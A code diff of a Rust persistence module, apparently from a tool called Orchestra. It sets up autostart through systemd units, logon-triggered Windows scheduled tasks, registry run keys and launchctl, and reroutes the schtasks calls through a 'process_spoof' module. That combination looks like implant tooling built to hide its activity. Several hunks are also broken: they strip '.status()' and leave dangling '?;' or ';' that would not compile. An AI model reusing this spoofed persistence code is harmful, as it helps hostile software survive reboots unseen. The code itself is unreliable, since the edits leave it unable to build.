@@ -128,7 +128,7 @@ fn install_systemd_unit() -> Result<PathBuf> {
     if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
         let status = std::process::Command::new("systemctl")
             .args(["--user", "enable", &format!("{service_name}.service")])
-            .status()?;
+            ?;
         if !status.success() {
             anyhow::bail!("systemctl enable failed with status: {status}");
         }
@@ -176,7 +176,7 @@ fn uninstall_persistence_inner() -> Result<()> {
                     "disable",
                     &format!("{}.service", get_service_name()),
                 ])
-                .status();
+                ;
         }
         std::fs::remove_file(&systemd_path)
             .with_context(|| format!("Failed to remove {}", systemd_path.display()))?;
@@ -216,12 +216,8 @@ fn install_scheduled_task() -> Result<PathBuf> {
     let task_name = get_service_name();
 
     if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
-        let status = std::process::Command::new("schtasks")
-            .args([
-                "/Create", "/F", "/SC", "ONLOGON", "/TN", task_name, "/TR", &exe_path,
-            ])
-            .status()
-            .context("Failed to invoke schtasks")?;
+        let args = ["/Create", "/F", "/SC", "ONLOGON", "/TN", task_name, "/TR", &exe_path];
+        let status = crate::process_spoof::execute_command("schtasks", &args, false).context("Failed to invoke schtasks")?.status;
         if !status.success() {
             anyhow::bail!("schtasks /Create exited with {status}");
         }
@@ -275,9 +271,8 @@ fn uninstall_persistence_inner() -> Result<()> {
 
             match method {
                 "schtasks" => {
-                    let _ = std::process::Command::new("schtasks")
-                        .args(["/Delete", "/F", "/TN", name])
-                        .status();
+                    let args = ["/Delete", "/F", "/TN", name];
+                    let _ = crate::process_spoof::execute_command("schtasks", &args, false);
                 }
                 "runkey" => {
                     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
@@ -372,7 +367,7 @@ fn install_persistence_inner() -> Result<PathBuf> {
 
         let status = std::process::Command::new("launchctl")
             .args(["bootstrap", &target, &target_path])
-            .status()?;
+            ?;
         if !status.success() {
             anyhow::bail!("launchctl bootstrap failed with status: {status}");
         }
@@ -410,7 +405,7 @@ fn uninstall_persistence_actual(path: PathBuf, system_level: bool) -> Result<()>
             };
             let _ = std::process::Command::new("launchctl")
                 .args(["bootout", &target_spec])
-                .status();
+                ;
         }
         std::fs::remove_file(&path).with_context(|| format!("Failed to remove {}", path.display()))?;
     }
